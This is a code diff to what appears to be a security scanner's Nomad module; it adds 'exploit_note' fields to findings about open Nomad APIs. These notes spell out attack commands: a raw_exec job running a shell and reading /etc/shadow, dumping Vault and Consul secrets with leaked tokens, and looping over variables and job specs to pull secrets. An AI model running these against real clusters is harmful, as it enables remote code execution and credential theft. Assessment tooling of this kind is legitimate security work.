@@ -360,9 +360,12 @@ def nomad_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
-            "tool": "nomad", "command": cmd, "remediation": rem, "cwes": cwes, "kind": kind}
+            "tool": "nomad", "command": cmd, "remediation": rem, "cwes": cwes,
+            "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -393,7 +396,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl http://{h.ip}:{p.portid}/v1/jobs",
                     "Enable ACLs in the Nomad server config (acl { enabled = true }); "
                     "bind the API to a private interface; require SecretID tokens.",
-                    ["CWE-306", "CWE-284", "CWE-200"], kind="nomad_unauth_read"))
+                    ["CWE-306", "CWE-284", "CWE-200"], kind="nomad_unauth_read",
+                    exploit_note=(
+                        "curl -sX POST http://<ip>:4646/v1/jobs -d @rawexec-job.json "
+                        "— with driver=raw_exec and command=/bin/id — runs as root "
+                        "on a client node."),
+                    depth_tier="t1"))
             else:
                 out.append(_finding(
                     "info", "Nomad endpoint reachable (ACL enforcing)", tgt,
@@ -419,7 +427,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Bootstrap ACLs immediately from a trusted host and store the "
                     "resulting management token in a secret manager; do not leave "
                     "acl.enabled=true on a fresh cluster unattended.",
-                    ["CWE-306", "CWE-1188"], kind="nomad_acl_bootstrap_available"))
+                    ["CWE-306", "CWE-1188"], kind="nomad_acl_bootstrap_available",
+                    exploit_note=(
+                        "Use captured SecretID: X-Nomad-Token: <token> to POST a "
+                        "raw_exec job that runs `id;hostname;cat /etc/shadow` on the "
+                        "client — full node compromise."),
+                    depth_tier="t3"))
 
             vault_cfg = pr.get("vault") or {}
             consul_cfg = pr.get("consul") or {}
@@ -444,7 +457,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Do not embed static tokens in the Nomad agent config; use "
                     "Vault agent auto-auth / Consul auto-encrypt and gate /v1/agent/self "
                     "behind an ACL policy that requires management scope.",
-                    ["CWE-522", "CWE-200"], kind="nomad_integration_token_leak"))
+                    ["CWE-522", "CWE-200"], kind="nomad_integration_token_leak",
+                    exploit_note=(
+                        "VAULT_ADDR=<leaked_addr> VAULT_TOKEN=<leaked_tok> vault kv "
+                        "list secret/; CONSUL_HTTP_ADDR=<leaked_addr> "
+                        "CONSUL_HTTP_TOKEN=<leaked_tok> consul kv get -recurse"),
+                    depth_tier="t3"))
 
             job_specs = pr.get("job_specs") or []
             secretful = [s for s in job_specs
@@ -482,7 +500,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Vault (with Nomad's Vault integration) or Nomad Variables "
                     "with a scoped ACL; deny anonymous read on /v1/job/:id.",
                     ["CWE-200", "CWE-522", "CWE-798"],
-                    kind="nomad_job_spec_secrets"))
+                    kind="nomad_job_spec_secrets",
+                    exploit_note=(
+                        "curl -s http://<ip>:4646/v1/job/<id> | jq -r "
+                        "'.TaskGroups[].Tasks[] | .Env' — env values in clear; curl "
+                        "http://<ip>:4646/v1/client/fs/cat/<allocid>?path=secrets/env "
+                        "— rendered template with real secrets."),
+                    depth_tier="t1"))
 
             submit = pr.get("job_submit") or ""
             if submit == "writable":
@@ -505,7 +529,15 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "explicitly needed; scope the submit-job capability to "
                     "operators only.",
                     ["CWE-306", "CWE-94", "CWE-78"],
-                    kind="nomad_job_submit_rce"))
+                    kind="nomad_job_submit_rce",
+                    exploit_note=(
+                        "cat > job.json <<'EOF' {\"Job\":{\"ID\":\"pwn\",\"Type\":"
+                        "\"batch\",\"Datacenters\":[\"dc1\"],\"TaskGroups\":[{\"Name"
+                        "\":\"g\",\"Tasks\":[{\"Name\":\"t\",\"Driver\":\"raw_exec\","
+                        "\"Config\":{\"command\":\"/bin/sh\",\"args\":[\"-c\","
+                        "\"id>/tmp/pwn\"]}}]}]}} EOF; curl -X POST "
+                        "http://<ip>:4646/v1/jobs -d @job.json"),
+                    depth_tier="t1"))
 
             variables = pr.get("vars") or []
             readable = [v for v in variables if v.get("values_readable")]
@@ -524,7 +556,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl -sk http://{h.ip}:{p.portid}/v1/vars",
                     "Scope the `anonymous` ACL policy to deny variables.read; grant "
                     "per-path variables policies only to the jobs that need them.",
-                    ["CWE-200", "CWE-522"], kind="nomad_variables_readable"))
+                    ["CWE-200", "CWE-522"], kind="nomad_variables_readable",
+                    exploit_note=(
+                        "curl -s http://<ip>:4646/v1/vars | jq -r '.[].Path' | while "
+                        "read p; do curl -s \"http://<ip>:4646/v1/var/$p\" | jq "
+                        ".Items; done"),
+                    depth_tier="t3"))
     return out
 
 
